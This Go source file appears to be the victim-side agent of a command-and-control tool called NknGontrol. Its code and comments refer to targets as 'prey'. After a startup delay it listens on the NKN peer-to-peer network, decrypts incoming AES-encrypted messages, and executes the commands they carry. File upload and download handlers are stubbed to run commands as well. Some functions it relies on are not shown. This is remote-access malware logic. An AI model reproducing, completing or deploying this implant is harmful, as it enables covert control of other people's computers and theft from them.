package main

import (
	"NknGontrol/module/command"
	"fmt"
	"time"

	"github.com/nknorg/nkn-sdk-go"
)

func main() {
	time.Sleep(25 * time.Second)
	StartPreyListener(PreyInfo.UDID)

}

// Dealmsg 管道中消息处理
func Dealmsg(msg *nkn.Message) {
	//debug 1 line
	fmt.Println("Receive message from", msg.Src)
	dedata := AesCompressListener(msg.Data)
	//debug 1 line
	fmt.Println(dedata)
	// 创建 preyAct
	var preyAct PreyStat
	preyAct.Json2Struct(dedata)
	switch preyAct.Status {
	case 1:
		RunCommand(msg, preyAct)
	case 2:

	case 3:
	default:
	}

	msg.Reply([]byte("working")) //传入interface类型，可以是byte数据，也可以是string
}

// RunCommand case1
func RunCommand(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
		//msg.Reply([]byte(Prey)) //传入interface类型，可以是byte数据，也可以是string
	}

}

// preyFileReceive case2 客户端上传，本端接受
func preyFileReceive(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
		// msg.Reply([]byte(Prey)) //传入interface类型，可以是byte数据，也可以是string
	}

}

// preyFileSend case3 客户端请求，本端加密发送
func preyFileSend(msg *nkn.Message, Prey PreyStat) {
	var err error
	_, Prey.Result, err = command.NewCommand().Exec(Prey.Task)
	if err != nil {
		fmt.Println(err)
		Prey.Result = "err"
		// msg.Reply([]byte(Prey)) //传入interface类型，可以是byte数据，也可以是string
	}

}
